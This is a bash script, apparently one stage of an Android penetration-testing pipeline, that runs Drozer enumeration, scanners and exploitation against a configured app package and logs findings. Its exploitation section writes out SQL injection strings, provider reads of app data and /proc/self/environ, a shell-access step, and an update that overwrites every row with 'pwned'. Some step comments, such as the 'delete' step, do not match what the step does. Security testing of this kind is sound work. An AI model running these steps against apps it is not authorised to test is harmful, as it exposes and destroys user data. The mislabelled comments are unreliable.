#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 03_dynamic_drozer.sh - Drozer enumeration + exploitation (all flags)
PROFILE_PHASE="03_dynamic_drozer"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name in config"; exit 1; }

cd "$RUN_DIR" || exit 1
info "Drozer testing on $PKG"

DROZER_DIR="$RUN_DIR/drozer"
mkdir -p "$DROZER_DIR"

# ---- Helpers ----
drozer_cmd() {
  local outfile="${1:-/dev/null}"
  shift
  printf '%s\n' "$@" | drozer console connect 2>/dev/null > "$outfile"
}

# ---- 1. Start drozer + port forward ----
info "Starting drozer server + port forward..."
adb shell "am startservice -n com.mwr.dz/.services.ServerService" 2>/dev/null || true
adb forward tcp:31415 tcp:31415 2>/dev/null
sleep 2

# ---- 2. List all modules ----
drozer_cmd "$DROZER_DIR/all_modules.txt" "list"

# ============================================================
# A. PACKAGE INFO (all flags)
# ============================================================
info "=== A. Package Enumeration ==="

# -a = package alias
drozer_cmd "$DROZER_DIR/A1_package_info.txt" \
  "run app.package.info -a $PKG"

# Get installation path
drozer_cmd "$DROZER_DIR/A2_package_path.txt" \
  "run app.package.path -a $PKG"

# Get UID
drozer_cmd "$DROZER_DIR/A3_package_uid.txt" \
  "run app.package.uid -a $PKG"

# Attack surface summary (lists all exported components in one shot)
drozer_cmd "$DROZER_DIR/A4_attack_surface.txt" \
  "run app.package.attacksurface $PKG"

# Manifest
drozer_cmd "$DROZER_DIR/A5_manifest.txt" \
  "run app.package.manifest $PKG"

# Certificate
drozer_cmd "$DROZER_DIR/A6_certificate.txt" \
  "run app.package.certificate $PKG"

# Debuggable
drozer_cmd "$DROZER_DIR/A7_debuggable.txt" \
  "run app.package.debuggable $PKG"

# Backup
drozer_cmd "$DROZER_DIR/A8_backup.txt" \
  "run app.package.backup $PKG"

ok "Package enumeration complete"

# ============================================================
# B. ACTIVITIES (all flags)
# ============================================================
info "=== B. Activities ==="

# -a = package
drozer_cmd "$DROZER_DIR/B1_activities.txt" \
  "run app.activity.info -a $PKG"

# Find all attackable activities
drozer_cmd "$DROZER_DIR/B2_activities_send.txt" \
  "run app.activity.send -a $PKG"

ok "Activities complete"

# ============================================================
# C. SERVICES (all flags)
# ============================================================
info "=== C. Services ==="

# -a = package
drozer_cmd "$DROZER_DIR/C1_services.txt" \
  "run app.service.info -a $PKG"

ok "Services complete"

# ============================================================
# D. CONTENT PROVIDERS (all flags)
# ============================================================
info "=== D. Content Providers ==="

# -a = package
drozer_cmd "$DROZER_DIR/D1_providers.txt" \
  "run app.provider.info -a $PKG"

# Find provider URIs
drozer_cmd "$DROZER_DIR/D2_provider_find.txt" \
  "run app.provider.find -a $PKG"

# Query root URI with flags:
#   --projection (-p) = specific columns
#   --where (-w) = SQL WHERE clause
#   --sort = ORDER BY
#   --vertical (-v) = vertical display
drozer_cmd "$DROZER_DIR/D3_provider_root_query.txt" \
  "run app.provider.query content://$PKG/ --vertical"

# Query with projection
drozer_cmd "$DROZER_DIR/D4_provider_projection.txt" \
  "run app.provider.query content://$PKG/ --projection _id --vertical"

# Query with WHERE
drozer_cmd "$DROZER_DIR/D5_provider_where.txt" \
  "run app.provider.query content://$PKG/ --where '_id=1' --vertical"

# Query with sort
drozer_cmd "$DROZER_DIR/D6_provider_sort.txt" \
  "run app.provider.query content://$PKG/ --sort '_id DESC' --vertical"

# Read file via provider
drozer_cmd "$DROZER_DIR/D7_provider_read.txt" \
  "run app.provider.read --uri content://$PKG/"

# Insert via provider
drozer_cmd "$DROZER_DIR/D8_provider_insert.txt" \
  "run app.provider.insert --uri content://$PKG/ --extra string key value"

# Update via provider
drozer_cmd "$DROZER_DIR/D9_provider_update.txt" \
  "run app.provider.update --uri content://$PKG/ --where '_id=1' --extra string key newvalue"

# Delete via provider
drozer_cmd "$DROZER_DIR/D10_provider_delete.txt" \
  "run app.provider.delete --uri content://$PKG/ --where '_id=1'"

ok "Content providers complete"

# ============================================================
# E. BROADCAST RECEIVERS (all flags)
# ============================================================
info "=== E. Broadcast Receivers ==="

# -a = package
drozer_cmd "$DROZER_DIR/E1_receivers.txt" \
  "run app.broadcast.info -a $PKG"

# Send broadcast with flags:
#   --component (-n) = target component
#   --action (-a) = intent action
#   --extra (-e) = extras (string, int, long, float, boolean, etc.)
drozer_cmd "$DROZER_DIR/E2_broadcast_send_boot.txt" \
  "run app.broadcast.send --component $PKG --action android.intent.action.BOOT_COMPLETED"

drozer_cmd "$DROZER_DIR/E3_broadcast_send_custom.txt" \
  "run app.broadcast.send --component $PKG --action com.$PKG.CUSTOM_ACTION --extra string data test"

drozer_cmd "$DROZER_DIR/E4_broadcast_send_battery.txt" \
  "run app.broadcast.send --action android.intent.action.BATTERY_LOW"

drozer_cmd "$DROZER_DIR/E5_broadcast_send_connectivity.txt" \
  "run app.broadcast.send --action android.net.conn.CONNECTIVITY_CHANGE"

# Send broadcast to non-exported receiver (via component)
drozer_cmd "$DROZER_DIR/E6_broadcast_send_internal.txt" \
  "run app.broadcast.send --component $PKG/.InternalReceiver --action com.$PKG.INTERNAL"

ok "Broadcast receivers complete"

# ============================================================
# F. INTENT INJECTION (all flags)
# ============================================================
info "=== F. Intent Injection ==="

# Intent send with all flags:
#   --action (-a) = intent action
#   --component (-n) = target component
#   --data-uri (-d) = data URI
#   --type (-t) = MIME type
#   --extra (-e) = extras (string, int, long, float, boolean)
#   --flags (-f) = intent flags (e.g. 0x10000000 for FLAG_ACTIVITY_NEW_TASK)
#   --grant-read-uri-permission
#   --grant-write-uri-permission

drozer_cmd "$DROZER_DIR/F1_intent_view_file.txt" \
  "run app.intent.send --action android.intent.action.VIEW --data-uri 'file:///data/data/$PKG/shared_prefs'"

drozer_cmd "$DROZER_DIR/F2_intent_view_http.txt" \
  "run app.intent.send --action android.intent.action.VIEW --data-uri 'http://127.0.0.1:8080' --flags 0x10000000"

drozer_cmd "$DROZER_DIR/F3_intent_send_data.txt" \
  "run app.intent.send --action android.intent.action.SEND --type 'text/plain' --extra string text 'injected data' --component $PKG/.ShareActivity"

drozer_cmd "$DROZER_DIR/F4_intent_view_content.txt" \
  "run app.intent.send --action android.intent.action.VIEW --data-uri 'content://$PKG/' --grant-read-uri-permission"

drozer_cmd "$DROZER_DIR/F5_intent_pick.txt" \
  "run app.intent.send --action android.intent.action.PICK --type 'image/*'"

drozer_cmd "$DROZER_DIR/F6_intent_get_content.txt" \
  "run app.intent.send --action android.intent.action.GET_CONTENT --type '*/*'"

# Non-exported activity launch with FLAG_GRANT_READ_URI_PERMISSION
drozer_cmd "$DROZER_DIR/F7_intent_nonexported.txt" \
  "run app.intent.send --component $PKG/.ExportedActivity --action com.$PKG.ACTION --flags 0x10000000 --grant-read-uri-permission --grant-write-uri-permission"

ok "Intent injection complete"

# ============================================================
# G. SHELL ACCESS (all flags)
# ============================================================
info "=== G. Shell Access ==="

# shell.id
drozer_cmd "$DROZER_DIR/G1_shell_id.txt" \
  "run shell.id"

# shell.call with args
drozer_cmd "$DROZER_DIR/G2_shell_call_id.txt" \
  "run shell.call /system/bin/id"

drozer_cmd "$DROZER_DIR/G3_shell_call_ps.txt" \
  "run shell.call /system/bin/ps"

drozer_cmd "$DROZER_DIR/G4_shell_call_cat.txt" \
  "run shell.call /system/bin/cat /etc/hosts"

# shell.start (interactive)
drozer_cmd "$DROZER_DIR/G5_shell_start.txt" \
  "run shell.start"

ok "Shell access complete"

# ============================================================
# H. SCANNER MODULES (all flags)
# ============================================================
info "=== H. Scanners ==="

# SQL injection detection
drozer_cmd "$DROZER_DIR/H1_sqli.txt" \
  "run scanner.provider.injection -a $PKG"

if grep -qi "vulnerable\|injection" "$DROZER_DIR/H1_sqli.txt" 2>/dev/null; then
  warn "SQL injection vulnerability detected!"
  fadd "SQL injection in content provider" HIGH HIGH CWE-89 "A03:2021" "$DROZER_DIR/H1_sqli.txt"
fi

# Path traversal detection
drozer_cmd "$DROZER_DIR/H2_traversal.txt" \
  "run scanner.provider.traversal -a $PKG"

if grep -qi "traversal\|\.\.\/" "$DROZER_DIR/H2_traversal.txt" 2>/dev/null; then
  warn "Path traversal detected!"
  fadd "Path traversal via content provider" HIGH HIGH CWE-22 "A01:2021" "$DROZER_DIR/H2_traversal.txt"
fi

# File access detection
drozer_cmd "$DROZER_DIR/H3_file_access.txt" \
  "run scanner.provider.file -a $PKG"

if grep -qi "read\|write" "$DROZER_DIR/H3_file_access.txt" 2>/dev/null; then
  warn "File access via provider"
  fadd "Content provider file access" HIGH HIGH CWE-22 "A01:2021" "$DROZER_DIR/H3_file_access.txt"
fi

# Blob access detection
drozer_cmd "$DROZER_DIR/H4_blob_access.txt" \
  "run scanner.provider.blob -a $PKG"

if grep -qi "blob\|large" "$DROZER_DIR/H4_blob_access.txt" 2>/dev/null; then
  warn "Blob/large object access via provider"
  fadd "Content provider blob access" MEDIUM MEDIUM CWE-200 "A01:2021" "$DROZER_DIR/H4_blob_access.txt"
fi

ok "Scanners complete"

# ============================================================
# I. EXPLOITATION ATTEMPTS (all flags)
# ============================================================
info "=== I. Exploitation ==="

# I1. Query with injection in WHERE
drozer_cmd "$DROZER_DIR/I1_inject_where.txt" \
  "run app.provider.query content://$PKG/ --where '1=1 OR 1=1' --vertical"

# I2. Query with union-based injection
drozer_cmd "$DROZER_DIR/I2_inject_union.txt" \
  "run app.provider.query content://$PKG/ --where '1=1 UNION SELECT 1,2,3--' --vertical"

# I3. Query with null injection
drozer_cmd "$DROZER_DIR/I3_inject_null.txt" \
  "run app.provider.query content://$PKG/ --where '1=1 AND NULL IS NULL' --vertical"

# I4. Read sensitive files via provider
for f in \
  "/data/data/$PKG/shared_prefs" \
  "/data/data/$PKG/databases" \
  "/data/data/$PKG/files" \
  "/data/data/$PKG/cache" \
  "/etc/hosts" \
  "/proc/version" \
  "/proc/self/environ" \
  "/data/local/tmp"; do
  SAFE_NAME=$(echo "$f" | tr '/' '_' | sed 's/^_//')
  drozer_cmd "$DROZER_DIR/I4_read_${SAFE_NAME}.txt" \
    "run app.provider.read --uri content://$PKG/$f" 2>/dev/null || true
done

# I5. Insert test data
drozer_cmd "$DROZER_DIR/I5_insert_test.txt" \
  "run app.provider.insert --uri content://$PKG/ --extra string test_key test_value"

# I6. Update test data
drozer_cmd "$DROZER_DIR/I6_update_test.txt" \
  "run app.provider.update --uri content://$PKG/ --where '1=1' --extra string test_key pwned"

# I7. Delete test data
drozer_cmd "$DROZER_DIR/I7_delete_test.txt" \
  "run app.broadcast.send --component $PKG --action android.intent.action.BOOT_COMPLETED"

# I8. Service abuse with extras
drozer_cmd "$DROZER_DIR/I8_service_abuse.txt" \
  "run app.service.send --component $PKG --extra string username admin --extra string password password123"

ok "Exploitation complete"

# ============================================================
# J. RESULTS ANALYSIS
# ============================================================
info "=== J. Analysis ==="

# Extract exported components from attack surface
ATTACK_SURFACE=$(cat "$DROZER_DIR/A4_attack_surface.txt" 2>/dev/null)

# Create summary
{
  echo "=== DROZER RESULTS SUMMARY ==="
  echo ""
  echo "Package: $PKG"
  echo "Date: $(date -Iseconds)"
  echo ""
  echo "--- Attack Surface ---"
  cat "$DROZER_DIR/A4_attack_surface.txt" 2>/dev/null
  echo ""
  echo "--- Debuggable ---"
  cat "$DROZER_DIR/A7_debuggable.txt" 2>/dev/null
  echo ""
  echo "--- Backup ---"
  cat "$DROZER_DIR/A8_backup.txt" 2>/dev/null
  echo ""
  echo "--- SQLi Scan ---"
  cat "$DROZER_DIR/H1_sqli.txt" 2>/dev/null
  echo ""
  echo "--- Traversal Scan ---"
  cat "$DROZER_DIR/H2_traversal.txt" 2>/dev/null
  echo ""
  echo "--- File Access Scan ---"
  cat "$DROZER_DIR/H3_file_access.txt" 2>/dev/null
  echo ""
  echo "--- Shell ID ---"
  cat "$DROZER_DIR/G1_shell_id.txt" 2>/dev/null
} > "$DROZER_DIR/SUMMARY.txt"

# Create findings from analysis
grep -qi "debuggable" "$DROZER_DIR/A7_debuggable.txt" 2>/dev/null && \
  fadd "App is debuggable" HIGH CERTAIN CWE-215 "A05:2021" "$DROZER_DIR/A7_debuggable.txt"

grep -qi "backup" "$DROZER_DIR/A8_backup.txt" 2>/dev/null && \
  fadd "Backup enabled" MEDIUM CERTAIN CWE-212 "A04:2021" "$DROZER_DIR/A8_backup.txt"

grep -qi "uid=0\|root" "$DROZER_DIR/G1_shell_id.txt" 2>/dev/null && \
  fadd "Root shell access achieved" CRITICAL CERTAIN CWE-269 "A01:2021" "$DROZER_DIR/G1_shell_id.txt"

# Clean up
adb forward --remove tcp:31415 2>/dev/null || true

ok "Drozer testing complete -> $DROZER_DIR"
fsnapshot
